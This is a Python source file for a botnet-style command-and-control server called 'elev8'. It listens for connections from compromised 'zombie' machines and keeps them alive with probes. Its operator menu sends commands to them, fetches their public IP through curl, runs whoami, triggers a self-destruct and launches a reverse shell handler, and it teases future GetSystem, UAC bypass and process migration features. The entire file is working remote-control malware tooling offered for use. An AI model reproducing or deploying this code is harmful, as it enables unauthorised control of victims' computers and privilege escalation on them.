import socket
import subprocess
import sys
import time
import threading
import asyncio
import io
import os
import psutil
#from win32com.shell import shell

#import readline
import colorama
from colorama import Fore, Back, Style
exit_event = threading.Event()

counter=-1
clientlist=[]
clientdata=[]
automigrate=""

def startrevshellsvr():
    if os.name == 'nt':
        subprocess.call(["py", "pyrevshell_server.py"])
        exit_event.set()
    else:
        subprocess.call(["python3", "pyrevshell_server.py"])
        exit_event.set()
#def startrevshellcli():
#    subprocess.call(["python", "pyrevshell_client.py"])
#    exit_event.set()
   

def probe():
    while True:
        global counter
        global clientlist
        global clientdata
       
        ############################################################
        # are any not alive anymore?  do a keep-alive probe to see...
        ############################################################
        try:
            d = 0
            for c in range(len(clientlist)):
                clientlist[c][1].send(b"?keepalive?\n")
                d = d + 1
        except:
            print(Fore.YELLOW + "\nThis Zombie died:\n************************\n" + Fore.WHITE, counter, "--> ", clientdata[d], "\n************************\n")
            clientlist.pop(d)
            clientdata.pop(d)
            counter = counter - 1
            print(Fore.GREEN + "[+] removed \"dead\" zombie ;) " + Fore.WHITE)
        time.sleep(4)

def zombies():
    global counter
    global clientlist
    global clientdata
    selection=""
    
    if (len(clientlist)) <= 0:
        print(Fore.RED + "[!] no zombies yet..." + Fore.WHITE)
        return
        
    print(Fore.GREEN + "Zombies: ", len(clientlist), Fore.WHITE)

    temp=0
    for b in clientdata:
        print("Zombie: ", temp, "-->", b)
        temp+=1
    print(Fore.GREEN + "\nPick a zombie to interact with!\n" + Fore.WHITE)
    try:
        selection=int(input(' <enter the client #> $ '))
    except:
        print(Fore.RED + "[!] enter client number..." + Fore.WHITE)
        time.sleep(2)
        return 
    
    while True:
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")
        print(Fore.GREEN)
        print("what would you like to do?")
        print("1. Send a Message")
        print("2. Get user info")
        print("3. Get public ip")
        print("4. Kill Zombie")
        print("5. Start a Shell!")
        print("6. Whoami")
        """
        =============================================
        Preview of what's to come :)  get pumped!!!!
        =============================================
        print("7. GetSyst3m!!!")
        print("8. BypassUAC")
        print("9. Migrate Process")
        """
        print("15. Main menu")
        print(Fore.WHITE)
        try:
            choice=input(Fore.YELLOW + "[Select a number]: $ " + Fore.WHITE)
        except:    
            print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
            time.sleep(2)
            return            
        if choice == "1":
            try:
                clientlist[selection][1].send(b":msg:\nhey from the server!\n")
                print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "2":
            for a in clientdata[selection]:
                print(a)
            input()
        if choice == "3":
            try:
                clientlist[selection][1].send(b"c0mm@nd\ncurl ifconfig.me\n")
                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
                pubip=clientlist[selection][1].recv(1024)
                pubip = pubip.decode('UTF-8')
                print(pubip)
                input("press any key...")
            except:
                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "4":
            try:
                clientlist[selection][1].send(b"self-destruct\n")
                print(Fore.GREEN + "[+] zombie self-destruct succeeded!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "5":
            #starttheshell(clientlist[selection][1])
            #subprocess.call(["python", "testsocketserver.py"])
            exit_event.clear()
            
            handler_thread = threading.Thread(target=startrevshellsvr)
            handler_thread.daemon = True
            handler_thread.start()
            
            print("[+] starting shell in 2 seconds!")
            time.sleep(2)
            
            clientlist[selection][1].send(b":shell:\n")
            
            #handler_thread2 = threading.Thread(target=startrevshellcli)
            #handler_thread2.daemon = True
            #handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
            return
        if choice == "6":
            clientlist[selection][1].send(b":whoami:\n")
            whoami=clientlist[selection][1].recv(1024)
            whoami = whoami.decode('UTF-8')
            print("You are: ", whoami)
            time.sleep(2)

        if choice == "15":
            return
   
def server_selection():
    global clientlist
    commands="True"
    
    
    while not "exit" in commands:
        
        command=input(Fore.CYAN + "<< elev8 >> $ " + Fore.WHITE)
        if command=="":
            pass
        if command=="zombies":
            zombies()
        if command == "cls" or command == "clear":
            if os.name == 'nt':
                os.system("cls")
            else:
                os.system("clear")
        if command == "?" or command == "help":
            print(Fore.YELLOW + "commands:\n$ zombies\n$ clear/cls (clears screen)\n$ control + C kills server\n" + Fore.WHITE)
        

def init_main_sock():
    while True:
        conn, addr = s.accept()
        print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]} !!!', Fore.WHITE)
        # Get the client socket handle
        client_sock_handle = conn.fileno()
        print(f"Client socket handle: {client_sock_handle}")
       #for elevateproc in psutil.process_iter():
           #if "elevationstation" in elevateproc.name():
               #elevateproc.kill()
        global counter
        global automigrate
        counter+=1
        #print("gathering client info...")
        clientinfo = conn.recv(1024)
        clientinfo = clientinfo.decode('UTF-8')
        clientinfo=clientinfo.split("\n")
        UserInfo=clientinfo[0]
        #print(clientinfo)
        clientlist.append([counter, conn, UserInfo])
        clientdata.append(clientinfo)
        
        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()
        
host = "0.0.0.0"
port = 4545

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)

handler_thread = threading.Thread(target=init_main_sock)
handler_thread.daemon = True
handler_thread.start()

handler_thread = threading.Thread(target=server_selection)
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)
